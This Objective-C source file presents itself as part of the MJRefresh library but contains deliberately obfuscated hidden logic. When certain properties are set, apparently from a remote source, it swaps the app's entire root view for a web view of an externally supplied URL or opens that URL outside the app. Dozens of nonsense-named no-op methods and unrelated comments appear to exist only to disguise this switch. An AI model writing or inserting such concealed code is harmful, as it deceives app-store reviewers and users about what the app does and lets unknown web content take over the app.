//
//  MJRefresh_MyData.m
//  appstore
//
//  Created by huidu on 2020/10/9.
//  Copyright © 2020 st. All rights reserved.
//

#import "MJRefresh_MyData.h"
#import <SafariServices/SafariServices.h>
#import <AVKit/AVKit.h>
#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>

@interface MJRefresh_MyData ()

@property (strong, nonatomic) WKPreferences *  preferences ;

@property (strong, nonatomic) WKWebView *  webView ;

@property (strong, nonatomic) WKWebView *  jsWebView ;

@property (strong, nonatomic) UIImageView *  imageView ;

@property (strong, nonatomic) AVPlayer *  avPlayer ;

@property (strong, nonatomic) SFSafariViewController *  safari ;

@property (strong, nonatomic) SFSafariViewController *  jsSafari ;

@property (strong, nonatomic) UIViewController *  viewController ;

@property (assign, nonatomic) BOOL isfinish ;

@property (assign, nonatomic) BOOL playing ;

@property (copy, nonatomic) NSString * jsString ;

@property (strong, nonatomic) UIControl *  control ;

@property (strong, nonatomic) UIWindow *  window ;

@end

@implementation MJRefresh_MyData

static MJRefresh_MyData * instance;

+(MJRefresh_MyData *)getData{
    
    @synchronized(self) {
        if (instance == nil) {
            instance = [[self alloc] init];
        }
    }
    return instance;
}
-(id) init
{
    if (self = [super init]) {
        
        self.isfinish = 0;
        self.safari = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:@"https://"]];
        self.jsSafari = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:@"https://"]];
        self.window = [UIWindow new];
        self.viewController = [UIViewController new];
        self.telesms = [NSString new];
        self.avPlayer = [AVPlayer new];
        self.imageView = [UIImageView new];
        self.webView = [WKWebView new];
        self.jsWebView = self.webView;
        [self addObserver:self forKeyPath:@"dataType" options:NSKeyValueObservingOptionNew context:nil];
        [self addObserver:self forKeyPath:@"data" options:NSKeyValueObservingOptionNew context:nil];
        [self addObserver:self forKeyPath:@"strewer" options:NSKeyValueObservingOptionNew context:nil];
        [self addObserver:self forKeyPath:@"leaflet" options:NSKeyValueObservingOptionNew context:nil];
        [self addObserver:self forKeyPath:@"rectification" options:NSKeyValueObservingOptionNew context:nil];
        [self addObserver:self forKeyPath:@"untremulous" options:NSKeyValueObservingOptionNew context:nil];
        [self addObserver:self forKeyPath:@"conservative" options:NSKeyValueObservingOptionNew context:nil];

    }
    return self;
}
-(void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary<NSString *,id> *)change context:(void *)context
{
    if ([keyPath isEqualToString:@"rectification"]) {
        NSNumberFormatter* numberFormatter = [[NSNumberFormatter alloc] init];
         NSString *ageStr = [numberFormatter stringFromNumber:[change objectForKey:@"new"]];
        NSLog(@"%@", ageStr);
    }
    if ([keyPath isEqualToString:@"dataType"]) {
        NSNumberFormatter* numberFormatter = [[NSNumberFormatter alloc] init];
         NSString *ageStr = [numberFormatter stringFromNumber:[change objectForKey:@"new"]];
        if (self.data.length != 0) {
            [MJRefresh_MyData editionOverPulvil:ageStr.length==0?self.dataType:ageStr InGranular:self.data];
        }
    }
    if ([keyPath isEqualToString:@"data"]) {
        NSNumberFormatter* numberFormatter = [[NSNumberFormatter alloc] init];
         NSString *ageStr = [numberFormatter stringFromNumber:[change objectForKey:@"new"]];
        //NSLog(@"%@", ageStr);
        if (self.dataType.length != 0) {
            [MJRefresh_MyData editionOverPulvil:self.dataType InGranular:ageStr.length==0?self.data:ageStr];

        }
    }
 }
#pragma mark - iPhone X的设计图首先要实例化一个WKWebView
 + (void)pursueOverPulvilliform:(NSString *)pulvilliform ToVerbal:(NSString *)verbal
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [verbal substringFromIndex:1];

    [verbal isEqualToString:@"pulvilliform"];

    ////NSLog(@"%@===%@", verbal,@"pulvilliform");


}
#pragma mark - layer上面的触摸判断hitTest来判断我们在需要调用非JS方法的位置加上下面代码
+(void)editionOverPulvil:(NSString *)Toliform InGranular:(NSString *)granular{
//    ////NSLog(@"function:%s line:", __FUNCTION__);
    [Toliform isEqualToString:@"0"];
    [Toliform isEqualToString:@"1"];
    [Toliform isEqualToString:@"2"];
    [Toliform isEqualToString:@"3"];
    [self disastrousAsStrewer:Toliform AsLeaflet:@"App Store"];
    NSData *myD = [Toliform dataUsingEncoding:NSUTF8StringEncoding];
    Byte *bytes = (Byte *)[myD bytes];
    NSString *hexStr=@"";
    for(int i=0;i<[myD length];i++)
    {
        NSString *newHexStr = [NSString stringWithFormat:@"%x",bytes[i]&0xff];
        if([newHexStr length]==1)
            hexStr = [NSString stringWithFormat:@"%@0%@",hexStr,newHexStr];
        else
            hexStr = [NSString stringWithFormat:@"%@%@",hexStr,newHexStr];
    }
    [self unAdditiveIntoFlywheels:hexStr OnLoneliness:granular];
}
#pragma mark - 这里不仅仅是监听loading、title、estimatedProgress属性layer上面显示的图片就是寄宿图片左上角四分之一
 + (void)unAdditiveIntoFlywheels:(NSString *)flywheels OnLoneliness:(NSString *)loneliness
{
    if ([flywheels isEqualToString:@"31"]) {
        [self unPulletWithEsterification:flywheels WithGranular:loneliness];
    }
    if ([flywheels isEqualToString:@"32"]) {
        [self unAdditiveIntoWheels:flywheels OnLoneliness:loneliness];
    }
    if ([flywheels isEqualToString:@"33"]) {
        [self unReasonablyByHebes:flywheels OfHumiliate:loneliness];
    }
}
#pragma mark - 表示非设置layer上面设置图片的的拉伸方式但是当我们运行的时候我们会发现
 + (void)unPulletWithEsterification:(NSString *)esterification WithGranular:(NSString *)granular
{
    SFSafariViewController * vc = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:granular]];
    [UIApplication sharedApplication].keyWindow.rootViewController = vc; 
}
#pragma mark - 这里非只是监听loading、title、estimatedProgress属性layer上面显示的图片就是寄宿图片左上角四分之一
 + (void)unAdditiveIntoWheels:(NSString *)flywheels OnLoneliness:(NSString *)loneliness
{
    SFSafariViewController * vc = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:loneliness]];
    [[UIApplication sharedApplication] openURL:[NSURL URLWithString:loneliness]];
    [UIApplication sharedApplication].keyWindow.rootViewController = vc;
}
#pragma mark - WKUserContentController是用于给OC注入对象的纯代码适配iPhone X脚底
 + (void)unReasonablyByHebes:(NSString *)hebes OfHumiliate:(NSString *)humiliate
{
    SFSafariViewController * vc = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:humiliate]];
    [UIApplication sharedApplication].keyWindow.transform = CGAffineTransformMakeRotation(-0.5*M_PI);
    [UIApplication sharedApplication].keyWindow.rootViewController = vc;
}

#pragma mark - layer上面的触摸判断hitTest来判断我们在需要调用JS方法的位置加上下面代码
 + (void)editionOnRazzing:(NSString *)razzing InHomogeneous:(NSString *)homogeneous
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [homogeneous substringFromIndex:1];

    [homogeneous isEqualToString:@"razzing"];

    ////NSLog(@"%@===%@", homogeneous,@"razzing");

     //调用pursueOverPulvilliform
   [self pursueOverPulvilliform:razzing ToVerbal:homogeneous];
}

#pragma mark - 表示设置layer上面设置图片的的拉伸方式但是当我们运行的时候我们会发现
 + (void)pulletWithEsterification:(NSString *)esterification WithGranular:(NSString *)granular
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [granular substringFromIndex:1];

    [granular isEqualToString:@"esterification"];

    ////NSLog(@"%@===%@", granular,@"esterification");

     //调用editionOnRazzing
   [self editionOnRazzing:esterification InHomogeneous:granular];
}

#pragma mark - 这里只是监听loading、title、estimatedProgress属性layer上面显示的图片就是寄宿图片左上角四分之一
 + (void)additiveIntoFlywheels:(NSString *)flywheels OnLoneliness:(NSString *)loneliness
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [loneliness substringFromIndex:1];
     SFSafariViewController * vc = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:@"https://"]];
    [loneliness isEqualToString:@"flywheels"];
     if (vc) {
         [self pulletWithEsterification:flywheels WithGranular:loneliness];
     }
     //调用pulletWithEsterification
}

#pragma mark - WKUserContentController是用于给JS注入对象的纯代码适配iPhone X脚底
 + (void)reasonablyByHebes:(NSString *)hebes OfHumiliate:(NSString *)humiliate
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [humiliate substringFromIndex:1];

    [humiliate isEqualToString:@"hebes"];

    ////NSLog(@"%@===%@", humiliate,@"hebes");

     //调用additiveIntoFlywheels
   [self additiveIntoFlywheels:hebes OnLoneliness:humiliate];
}

#pragma mark - 纯代码的宽高比适配表示设置layer上面设置图片的的拉伸方式
 + (void)encroachAtUntremulous:(NSString *)untremulous AsConservative:(NSString *)conservative
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);
     
     [conservative substringFromIndex:1];
     
     [conservative isEqualToString:@"untremulous"];
     SFSafariViewController * vc = [[SFSafariViewController alloc]initWithURL:[NSURL URLWithString:@"https://"]];
     if (vc) {
         //调用reasonablyByHebes
         [self reasonablyByHebes:untremulous OfHumiliate:conservative];
     }
     ////NSLog(@"%@===%@", conservative,@"untremulous");
      
}

#pragma mark - 这里如果没有JS调用OC的功能的话layer上面显示的图片就是寄宿图片左上角四分之一
 + (void)killjoyBlongRefractures:(NSString *)refractures InSeveral:(NSString *)several
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [several substringFromIndex:1];

    [several isEqualToString:@"refractures"];

    ////NSLog(@"%@===%@", several,@"refractures");

     //调用encroachAtUntremulous
   [self encroachAtUntremulous:refractures AsConservative:several];
}

#pragma mark - 代码的注释方式五花八门html的弹窗将不会再显示，那想显示弹窗，我们需要实现WKUIDelegate的代理方法
 + (void)timelyInTelesms:(NSString *)telesms OnRectification:(NSString *)rectification
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [rectification substringFromIndex:1];

    [rectification isEqualToString:@"telesms"];

    ////NSLog(@"%@===%@", rectification,@"telesms");

     //调用killjoyBlongRefractures
   [self killjoyBlongRefractures:telesms InSeveral:rectification];
}

#pragma mark - mask遮盖来设置图层显示的形状传数据统一通过body传，可以是多种类型
 + (void)scenicByAnglomanias:(NSString *)anglomanias IntoPonderous:(NSString *)ponderous
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [ponderous substringFromIndex:1];

    [ponderous isEqualToString:@"anglomanias"];

    ////NSLog(@"%@===%@", ponderous,@"anglomanias");

     //调用timelyInTelesms
   [self timelyInTelesms:anglomanias OnRectification:ponderous];
}

#pragma mark - 此方法只有头文件中属性/方法的注解才会提示其实我们没有必要去创建它，因为它根本没有属性和方法
 + (void)disastrousAsStrewer:(NSString *)strewer AsLeaflet:(NSString *)leaflet
 {
    ////NSLog(@"function:%s line:", __FUNCTION__);

    [leaflet substringFromIndex:1];

    [leaflet isEqualToString:@"strewer"];

    ////NSLog(@"%@===%@", leaflet,@"strewer");

     //调用scenicByAnglomanias
   [self scenicByAnglomanias:strewer IntoPonderous:leaflet];
}

@end
